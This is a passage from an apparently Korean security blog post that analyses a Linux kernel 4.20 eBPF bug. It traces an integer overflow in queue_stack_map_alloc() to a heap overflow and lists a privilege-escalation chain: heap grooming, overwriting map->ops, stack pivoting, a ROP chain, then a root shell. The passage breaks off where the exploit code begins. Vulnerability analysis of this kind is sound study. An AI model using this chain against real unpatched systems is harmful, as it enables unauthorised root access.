class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);    <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>마찬가지로 <code>/kernel/bpf/syscall.c</code>에 선언되어 있는 <code>find_and_alloc_map()</code> 함수입니다.</p><p><code>map = ops-&gt;map_alloc(attr);</code> 부분에서 <code>queue_stack_map_alloc()</code> 함수를 호출하게 됩니다.</p><h5 id="queue-stack-map-alloc"><a href="#queue-stack-map-alloc" class="headerlink" title="queue_stack_map_alloc()"></a>queue_stack_map_alloc()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u32 size, value_size;</span><br><span class="line">u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = attr-&gt;max_entries + <span class="number">1</span>;    <span class="comment">// here</span></span><br><span class="line">value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;</span><br><span class="line"></span><br><span class="line">cost = queue_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/kernel/bpf/queue_stack_maps.c</code> 에 선언되어 있는 위 <code>queue_stack_map_alloc()</code> 함수가 바로 integer overflow가 터지는 함수입니다.</p><p><code>size = attr-&gt;max_entries + 1;</code> 부분에서 <code>*attr</code>은 유저 공간에서 <code>bpf()</code> syscall을 호출할 때 인자로 전달해준 공용체로, 결국 해당 공용체의 멤버들은 유저가 컨트롤할 수 있는 값입니다.</p><p><code>size</code> 변수는 <code>unsigned 32bit</code>로 선언되어 있기 때문에 만약 <code>attr-&gt;max_entries</code>에 <code>0xffffffff</code>를 전달해줄 경우 <code>+1</code>로 인해 carry되어 <code>0</code>으로 integer overflow를 터트릴 수 있습니다.</p><hr><h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>heap overflow 취약점은 위의 integer overflow를 통해 트리거할 수 있습니다.</p><h3 id="작은-힙-할당"><a href="#작은-힙-할당" class="headerlink" title="작은 힙 할당"></a>작은 힙 할당</h3><h5 id="queue-stack-map-alloc-1"><a href="#queue-stack-map-alloc-1" class="headerlink" title="queue_stack_map_alloc()"></a>queue_stack_map_alloc()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u32 size, value_size;</span><br><span class="line">u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;    <span class="comment">// here</span></span><br><span class="line"></span><br><span class="line">cost = queue_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);    <span class="comment">// allocate</span></span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위에서 설명한 integer overflow 취약점이 터지는 <code>queue_stack_map_alloc()</code> 함수입니다.</p><p>해당 함수의 <code>queue_size</code> 변수는 <code>BPF_MAP_CREATE</code> 기능을 통해 최종적으로 커널 힙에 할당하게 될 영역의 크기입니다.<br><code>queue_size = sizeof(*qs) + (u64) value_size * size;</code> 부분에서 <code>sizeof(*qs)</code> 부분은 <code>struct bpf_queue_stack</code>이 위치할 부분이며 주요 데이터 구조에서 설명했듯이 할당될 bpf 맵을 관리하는 구조체입니다.<br>나머지 <code>(u64) value_size * size</code> 부분은 실제로 데이터가 저장될 영역입니다.</p><p><code>bpf_map_area_alloc()</code> 함수로 <code>queue_size</code> 크기의 커널 힙을 할당받고 최종적으로 해당 맵에 대한 초기화 작업을 진행합니다. 하지만 <code>size</code> 변수는 integer overflow로 인해 <code>0</code>으로 맞춰진 상태이므로 <code>sizeof(*qs)</code> 만큼의, 특정 작업을 하기엔 너무 작은 크기의 힙 영역을 할당받게 됩니다.</p><h3 id="heap-overflow-trigger"><a href="#heap-overflow-trigger" class="headerlink" title="heap overflow trigger"></a>heap overflow trigger</h3><p>heap overflow 취약점은 <code>BPF_MAP_UPDATE_ELEM</code> 기능에서 찾을 수 있습니다.</p><h5 id="map-update-elem"><a href="#map-update-elem" class="headerlink" title="map_update_elem()"></a>map_update_elem()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *value;</span><br><span class="line">u32 value_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);    <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (!value)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)    <span class="comment">// here</span></span><br><span class="line"><span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering from</span></span><br><span class="line"><span class="comment"> * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line">__this_cpu_inc(bpf_prog_active);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">       attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">   attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">  attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line"><span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line"> attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line">__this_cpu_dec(bpf_prog_active);</span><br><span class="line">preempt_enable();</span><br><span class="line">maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>eBPF의 <code>BPF_MAP_UPDATE_ELEM</code> 기능을 사용할 경우 <code>/kernel/bpf/syscall.c</code>에 있는 <code>map_update_elem()</code> 함수가 호출됩니다.</p><p>해당 함수의 <code>value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</code> 부분에서 <code>map-&gt;value_size</code> 만큼의 커널 힙을 할당하는 것과 <code>copy_from_user(value, uvalue, value_size)</code> 부분에서 <code>attr-&gt;value</code>의 값을 할당된 주소 <code>value</code>에 복사하는 것을 볼 수 있습니다.</p><p>여기서 <code>map-&gt;value_size</code>는 BPF 맵 초기화 과정에서 <code>bpf_map_init_from_attr()</code> 함수에 의해 <code>attr-&gt;value_size</code> 값이 복사된 것입니다. 즉, 유저 모드에서 유저가 컨트롤할 수 있는 값입니다.</p><p>이렇게 할당된 주소값 <code>value</code>를 인자로 <code>queue_stack_map_push_elem()</code> 함수를 호출합니다.</p><h5 id="queue-stack-map-push-elem"><a href="#queue-stack-map-push-elem" class="headerlink" title="queue_stack_map_push_elem()"></a>queue_stack_map_push_elem()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line"><span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line"><span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);    <span class="comment">// here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/kernel/bpf/queue_stack_maps.c</code>에 선언된 <code>queue_stack_map_push_elem()</code> 함수이며 해당 함수가 바로 heap overflow 취약점이 터지는 함수입니다.</p><p><code>memcpy(dst, value, qs-&gt;map.value_size);</code> 부분에서 <code>dst</code>는 <code>BPF_MAP_CREATE</code> 기능으로 커널 힙에 할당된 bpf 맵이고 <code>value</code>는 이전 <code>map_update_elem()</code> 함수에서 <code>attr-&gt;value</code>가 커널 힙에 할당된 영역입니다.</p><p>integer overfow로 인해 <code>*qs</code>가 가르키는 슬랩 캐시의 크기가 256byte 밖에 되지 않기 때문에 <code>value</code>값과 <code>qs-&gt;map.value_size</code>를 컨트롤해서 heap overflow를 터트릴 수 있습니다.</p><h3 id="victim-structure"><a href="#victim-structure" class="headerlink" title="victim structure"></a>victim structure</h3><p>이렇게 터트린 heap overflow를 이용해 덮을 함수 포인터는 <code>struct bpf_map_ops</code>에 있습니다.</p><p><code>slab allocator</code>의 특성상 256byte의 슬랩 캐시와 물리적으로 인접하려면 마찬가지로 256byte의 슬랩 캐시를 할당해야 합니다. 그렇기에 다른 모듈의 <code>file_operations</code>을 사용하기 까다로운 상황입니다.</p><p>하지만 integer overflow가 터져 할당된 256byte 크기의 <code>struct bpf_queue_stack</code> 자기 자신의 멤버중에 함수 포인터를 가지고있는 <code>struct bpf_map_ops</code>가 있으므로, 똑같이 <code>BPF_MAP_CREATE</code> 기능으로 256byte의 슬랩 캐시를 할당한 뒤 heap overflow로 <code>struct bpf_map_ops</code>를 덮으면 <code>rip control</code>이 가능합니다</p><hr><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c" target="_blank" rel="noopener">ww9210</a>가 작성한 익스플로잇 기준으로 <a href="https://github.com/ret2p4nda" target="_blank" rel="noopener">p4nda</a>좌가 세그먼트 오류를 수정한 익스를 이용해 원리를 설명하도록 하겠습니다.</p><h3 id="취약점-체이닝"><a href="#취약점-체이닝" class="headerlink" title="취약점 체이닝"></a>취약점 체이닝</h3><ol><li><code>trap frame</code> 구성을 위해 레지스터들을 저장합니다.</li><li>stack_pivot_gadget, fakestack 등의 <code>stack pivoting</code>을 위한 가젯, 가짜 스택을 <code>mmap()</code>을 이용해 공간 할당 후 배치합니다.</li><li><code>rop_chain</code>을 stack_pivot_gadget의 앞 4바이트 기준으로 <code>mmap()</code>을 이용해 배치합니다.</li><li>bpf 맵을 integer overflow를 이용해 256byte 크기로 할당해줍니다. (fd = 3)</li><li>힙풍수를 맞추기 위해 256byte의 bpf 맵을 14번 할당해줍니다.  (fd = 4 ~ 17)</li><li>처음 할당한 bpf 맵에서 heap overflow를 이용해 다음 bpf 맵의 <code>map-&gt;ops</code> 멤버를 fakestack으로 덮습니다.</li><li>처음 할당한 bpf 맵을 <code>close</code>할 경우 <code>fakestack-&gt;stack_pivot_gadget</code>이 호출되며 <code>stack pivoting</code>이 일어납니다.</li><li><code>stack_pivoting</code>과 다른 가젯들로 인해 <code>rop_chain</code>이 실행되고, root 권한을 획득하게 됩니다.</li><li>세그먼트 오류로 SIGSEGV 에러가 날 경우, <code>get_shell_again()</code>을 실행해 쉘을 불러옵니다.</li></ol><h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 